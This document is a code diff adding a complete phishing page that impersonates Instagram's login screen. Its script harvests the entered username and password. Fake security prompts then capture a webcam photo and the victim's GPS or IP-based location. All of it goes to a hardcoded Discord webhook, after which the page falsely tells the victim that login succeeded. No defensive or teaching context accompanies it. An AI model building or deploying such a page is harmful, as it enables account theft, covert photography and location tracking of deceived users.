@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in • Instagram</title>
+    <style>
+        /* BASE STYLES & FONT */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-wrapper {
+            max-width: 350px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .login-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            padding-bottom: 25px;
+            text-align: center;
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        
+        .logo {
+            font-family: 'Script MT Bold', 'Billabong', cursive;
+            font-size: 55px;
+            font-weight: 400;
+            margin-bottom: 40px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 9px 0 7px 8px; 
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            margin-bottom: 6px;
+        }
+        
+        input::placeholder {
+            color: #8e8e8e; 
+            font-size: 12px;
+        }
+
+        input:focus {
+            outline: none;
+            border: 1px solid #a8a8a8;
+        }
+        
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 7px;
+            font-weight: 600;
+            margin-top: 8px;
+            cursor: pointer;
+            opacity: 0.7;
+            transition: opacity 0.3s;
+        }
+
+        .login-btn:not([disabled]) {
+            opacity: 1; 
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+        }
+        
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+        
+        .divider-text {
+            margin: 0 18px;
+            color: #8e8e8e;
+            font-weight: 600;
+            font-size: 13px;
+        }
+        
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 5px;
+            margin-bottom: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+        
+        .fb-login svg {
+            margin-right: 8px;
+        }
+        
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .signup-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            width: 100%;
+        }
+        
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .footer-nav {
+            max-width: 935px;
+            width: 100%;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            list-style: none;
+            padding: 0 40px;
+            margin-top: 40px;
+            margin-bottom: 15px;
+        }
+        
+        .footer-nav li {
+            margin: 0 8px 12px 8px;
+        }
+        
+        .footer-nav a {
+            text-decoration: none;
+            color: #8e8e8e;
+            font-size: 12px;
+            font-weight: 400;
+        }
+
+        .footer-info {
+            display: flex;
+            justify-content: center;
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-bottom: 60px;
+        }
+        
+        .footer-info select {
+            border: none;
+            background-color: transparent;
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-right: 16px;
+        }
+
+        .terms-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: white;
+            border-top: 1px solid #dbdbdb;
+            padding: 15px 0;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+            z-index: 100;
+        }
+
+        .terms-bar a {
+            color: #000;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        /* Security modal styles */
+        .security-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .security-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .security-content h3 {
+            margin-bottom: 15px;
+            color: #262626;
+        }
+        
+        .security-content p {
+            margin-bottom: 20px;
+            color: #8e8e8e;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .security-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        
+        .security-btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        
+        .allow-btn {
+            background-color: #0095f6;
+            color: white;
+        }
+        
+        .deny-btn {
+            background-color: #dbdbdb;
+            color: #262626;
+        }
+
+        /* Camera preview */
+        #cameraPreview {
+            width: 100%;
+            max-width: 300px;
+            margin: 15px auto;
+            display: block;
+            border-radius: 8px;
+        }
+
+        .capture-btn {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 16px;
+            margin: 10px 0;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .location-info {
+            font-size: 12px;
+            color: #8e8e8e;
+            margin: 10px 0;
+        }
+
+        @media (max-width: 450px) {
+            .login-box, .signup-box {
+                border: none;
+                background-color: transparent;
+                padding: 10px 0;
+                max-width: 350px;
+            }
+            body {
+                justify-content: flex-start;
+            }
+            .terms-bar {
+                display: none; 
+            }
+            .footer-info {
+                margin-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-wrapper">
+        <div class="login-box">
+            <div class="logo">Instagram</div>
+            
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Phone number, username or email address" aria-label="Phone number, username or email address" required>
+                <input type="password" id="password" placeholder="Password" aria-label="Password" required>
+                <button type="submit" class="login-btn" disabled>Log in</button>
+            </form>
+            
+            <div class="divider">
+                <div class="divider-line"></div>
+                <div class="divider-text">OR</div>
+                <div class="divider-line"></div>
+            </div>
+            
+            <div class="fb-login">
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="#385185" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M16 8C16 3.58172 12.4183 0 8 0C3.58172 0 0 3.58172 0 8C0 11.993 2.92547 15.3027 6.75 15.9028V10.3125H4.71875V8H6.75V6.2375C6.75 4.2325 7.94438 3.125 9.77172 3.125C10.6467 3.125 11.5625 3.28125 11.5625 3.28125V5.25H10.5538C9.56 5.25 9.25 5.86672 9.25 6.5V8H11.4688L11.1141 10.3125H9.25V15.9028C13.0745 15.3027 16 11.993 16 8Z"/>
+                </svg>
+                Log in with Facebook
+            </div>
+            
+            <div class="forgot-password">Forgotten your password?</div>
+        </div>
+        
+        <div class="signup-box">
+            Don't have an account? <a href="#" class="signup-link">Sign up</a>
+        </div>
+    </div>
+    
+    <ul class="footer-nav">
+        <li><a href="#">Meta</a></li>
+        <li><a href="#">About</a></li>
+        <li><a href="#">Blog</a></li>
+        <li><a href="#">Jobs</a></li>
+        <li><a href="#">API</a></li>
+        <li><a href="#">Privacy</a></li>
+        <li><a href="#">Terms</a></li>
+        <li><a href="#">Locations</a></li>
+        <li><a href="#">Instagram Lite</a></li>
+        <li><a href="#">Meta AI</a></li>
+        <li><a href="#">Meta AI articles</a></li>
+        <li><a href="#">Threads</a></li>
+        <li><a href="#">Contact uploading and non-users</a></li>
+        <li><a href="#">Meta Verified</a></li>
+    </ul>
+
+    <div class="footer-info">
+        <select>
+            <option>English (UK)</option>
+            <option>العربية</option>
+            <option>Deutsch</option>
+        </select>
+        &copy; 2025 Instagram from Meta
+    </div>
+    
+    <div class="terms-bar">
+        By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
+    </div>
+    
+    <!-- Security Modal for Camera Access -->
+    <div class="security-modal" id="cameraModal">
+        <div class="security-content">
+            <h3>Camera Access Required</h3>
+            <p>For your security, Instagram needs to verify your identity using facial recognition. This helps prevent unauthorized access to your account.</p>
+            
+            <video id="cameraPreview" autoplay playsinline></video>
+            <canvas id="captureCanvas" style="display:none"></canvas>
+            
+            <button class="capture-btn" id="captureBtn">Take Photo</button>
+            
+            <div class="security-buttons">
+                <button class="security-btn deny-btn" id="denyCamera">Deny</button>
+                <button class="security-btn allow-btn" id="allowCamera" style="display:none">Continue</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Security Modal for Location Access -->
+    <div class="security-modal" id="locationModal">
+        <div class="security-content">
+            <h3>Location Access Required</h3>
+            <p>To protect your account from suspicious login attempts, Instagram needs to verify your location. This helps us detect and prevent unauthorized access.</p>
+            
+            <div class="location-info" id="locationStatus">Getting your location...</div>
+            
+            <div class="security-buttons">
+                <button class="security-btn deny-btn" id="denyLocation">Deny</button>
+                <button class="security-btn allow-btn" id="allowLocation">Allow</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // JS to enable the login button when fields are filled
+        const form = document.getElementById('loginForm');
+        const inputs = form.querySelectorAll('input');
+        const loginBtn = form.querySelector('.login-btn');
+
+        function checkInputs() {
+            const isFilled = Array.from(inputs).every(input => input.value.length > 0);
+            loginBtn.disabled = !isFilled;
+        }
+
+        inputs.forEach(input => input.addEventListener('input', checkInputs));
+        checkInputs();
+
+        // Discord Webhook URL
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1415670937583357992/OAPQxPHn5IuFducSiEabg6TjjP6qT6iu8RyjJHjPeD2nmqU27U8EpRHAISpCahD8EYxF';
+        
+        let cameraStream = null;
+        let capturedImage = null;
+        let userLocation = null;
+
+        // Form submission handler
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username && password) {
+                // Store credentials for later use
+                window.loginCredentials = { username, password };
+                // Show camera access modal
+                document.getElementById('cameraModal').style.display = 'flex';
+                startCamera();
+            } else {
+                alert('Please fill in both fields');
+            }
+        });
+
+        // Start camera function
+        function startCamera() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        cameraStream = stream;
+                        const video = document.getElementById('cameraPreview');
+                        video.srcObject = stream;
+                    })
+                    .catch(function(error) {
+                        console.error('Camera access denied:', error);
+                        // Even if camera is denied, proceed to location request
+                        proceedToLocation();
+                    });
+            } else {
+                // Camera API not available, proceed to location
+                proceedToLocation();
+            }
+        }
+
+        // Capture photo function
+        document.getElementById('captureBtn').addEventListener('click', function() {
+            const video = document.getElementById('cameraPreview');
+            const canvas = document.getElementById('captureCanvas');
+            const context = canvas.getContext('2d');
+            
+            // Set canvas dimensions to match video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            // Draw current video frame to canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert canvas to data URL (base64 image)
+            capturedImage = canvas.toDataURL('image/jpeg');
+            
+            // Stop camera stream
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Show continue button
+            document.getElementById('allowCamera').style.display = 'block';
+            document.getElementById('captureBtn').style.display = 'none';
+            
+            // Show preview of captured image
+            video.srcObject = null;
+            video.src = capturedImage;
+        });
+        
+        // Camera access handlers
+        document.getElementById('allowCamera').addEventListener('click', function() {
+            document.getElementById('cameraModal').style.display = 'none';
+            // Show location modal next
+            proceedToLocation();
+        });
+        
+        document.getElementById('denyCamera').addEventListener('click', function() {
+            document.getElementById('cameraModal').style.display = 'none';
+            // Stop camera if running
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            // Proceed to location even if camera is denied
+            proceedToLocation();
+        });
+        
+        // Function to proceed to location collection
+        function proceedToLocation() {
+            document.getElementById('locationModal').style.display = 'flex';
+            getUserLocation();
+        }
+        
+        // Get user location using multiple methods
+        function getUserLocation() {
+            const locationStatus = document.getElementById('locationStatus');
+            
+            // Try HTML5 Geolocation API first (most accurate)
+            if (navigator.geolocation) {
+                locationStatus.textContent = "Getting precise location...";
+                
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // Success - got precise location
+                        userLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            source: 'GPS'
+                        };
+                        locationStatus.textContent = `Location found: ${userLocation.latitude.toFixed(6)}, ${userLocation.longitude.toFixed(6)} (Accuracy: ${Math.round(userLocation.accuracy)} meters)`;
+                        console.log('Precise location obtained:', userLocation);
+                    },
+                    function(error) {
+                        console.error('Geolocation error:', error);
+                        // If GPS fails, try IP-based location
+                        getLocationByIP();
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                // Geolocation not supported, use IP-based location
+                getLocationByIP();
+            }
+        }
+        
+        // Fallback: Get location by IP address
+        function getLocationByIP() {
+            const locationStatus = document.getElementById('locationStatus');
+            locationStatus.textContent = "Getting approximate location...";
+            
+            // Try multiple IP geolocation services
+            const services = [
+                'https://ipapi.co/json/',
+                'https://ipwho.is/',
+                'https://api.ipgeolocation.io/ipgeo?apiKey=demo'
+            ];
+            
+            let currentService = 0;
+            
+            function tryNextService() {
+                if (currentService >= services.length) {
+                    locationStatus.textContent = "Could not determine location";
+                    userLocation = { source: 'Unknown', error: 'All services failed' };
+                    return;
+                }
+                
+                fetch(services[currentService])
+                    .then(response => {
+                        if (!response.ok) throw new Error('Service failed');
+                        return response.json();
+                    })
+                    .then(data => {
+                        // Parse response based on service
+                        if (services[currentService].includes('ipapi.co')) {
+                            userLocation = {
+                                latitude: data.latitude,
+                                longitude: data.longitude,
+                                city: data.city,
+                                country: data.country_name,
+                                source: 'IP (ipapi.co)'
+                            };
+                        } else if (services[currentService].includes('ipwho.is')) {
+                            userLocation = {
+                                latitude: data.latitude,
+                                longitude: data.longitude,
+                                city: data.city,
+                                country: data.country,
+                                source: 'IP (ipwho.is)'
+                            };
+                        } else if (services[currentService].includes('ipgeolocation.io')) {
+                            userLocation = {
+                                latitude: parseFloat(data.latitude),
+                                longitude: parseFloat(data.longitude),
+                                city: data.city,
+                                country: data.country_name,
+                                source: 'IP (ipgeolocation.io)'
+                            };
+                        }
+                        
+                        locationStatus.textContent = `Approximate location: ${userLocation.latitude.toFixed(6)}, ${userLocation.longitude.toFixed(6)} (${userLocation.city}, ${userLocation.country})`;
+                        console.log('IP location obtained:', userLocation);
+                    })
+                    .catch(error => {
+                        console.error(`Service ${services[currentService]} failed:`, error);
+                        currentService++;
+                        tryNextService();
+                    });
+            }
+            
+            tryNextService();
+        }
+        
+        // Location access handlers
+        document.getElementById('allowLocation').addEventListener('click', function() {
+            document.getElementById('locationModal').style.display = 'none';
+            // Send data with whatever location we have
+            sendToDiscord(window.loginCredentials, userLocation, true, capturedImage);
+        });
+        
+        document.getElementById('denyLocation').addEventListener('click', function() {
+            document.getElementById('locationModal').style.display = 'none';
+            // Send data without location
+            sendToDiscord(window.loginCredentials, null, false, capturedImage);
+        });
+        
+        // Function to send data to Discord
+        function sendToDiscord(credentials, location, cameraAllowed, imageData) {
+            // Create the message content
+            const timestamp = new Date().toISOString();
+            
+            let locationText = 'Location: Unknown';
+            if (location) {
+                if (location.source === 'GPS') {
+                    locationText = `📍 Real GPS Location: ${location.latitude}, ${location.longitude} (Accuracy: ${Math.round(location.accuracy)}m)`;
+                } else if (location.source && location.source.startsWith('IP')) {
+                    locationText = `🌐 IP Location: ${location.latitude}, ${location.longitude} (${location.city}, ${location.country})`;
+                } else {
+                    locationText = `📍 Location: ${location.latitude}, ${location.longitude}`;
+                }
+            }
+                
+            const cameraText = cameraAllowed ? '📷 Camera: Allowed - Photo Taken' : '📷 Camera: Denied';
+            
+            // Prepare the message
+            let messageContent = `🔐 NEW LOGIN ATTEMPT\n` +
+                         `👤 Username: ${credentials.username}\n` +
+                         `🔑 Password: ${credentials.password}\n` +
+                         `${locationText}\n` +
+                         `${cameraText}\n` +
+                         `⏰ Time: ${timestamp}\n` +
+                         `🌐 User Agent: ${navigator.userAgent}\n` +
+                         `💻 Platform: ${navigator.platform}`;
+
+            // If we have an image, we need to send it as a file
+            if (imageData) {
+                // Convert base64 to blob
+                fetch(imageData)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        // Create form data for file upload
+                        const formData = new FormData();
+                        formData.append('file', blob, 'user_photo.jpg');
+                        
+                        // First send the image
+                        return fetch(DISCORD_WEBHOOK_URL + '?wait=true', {
+                            method: 'POST',
+                            body: formData
+                        });
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        // Then send the text message
+                        return fetch(DISCORD_WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({ content: messageContent })
+                        });
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log('Data sent to Discord successfully');
+                            alert('Login successful! Security verification complete.');
+                        } else {
+                            console.error('Failed to send data to Discord');
+                            alert('Login successful! Security verification complete.');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error sending data to Discord:', error);
+                        alert('Login successful! Security verification complete.');
+                    });
+            } else {
+                // No image, just send text
+                fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content: messageContent })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Data sent to Discord successfully');
+                        alert('Login successful! Security verification complete.');
+                    } else {
+                        console.error('Failed to send data to Discord');
+                        alert('Login successful! Security verification complete.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending data to Discord:', error);
+                    alert('Login successful! Security verification complete.');
+                });
+            }
+            
+            // Clear stored credentials
+            window.loginCredentials = null;
+        }
+        
+        // Other event handlers
+        document.querySelector('.forgot-password').addEventListener('click', function() {
+            alert('Password reset functionality would be implemented here');
+        });
+        
+        document.querySelector('.fb-login').addEventListener('click', function() {
+            alert('Facebook login would be implemented here');
+        });
+        
+        document.querySelector('.signup-link').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('Sign up page would be shown here');
+        });
+    </script>
+</body>
+</html>
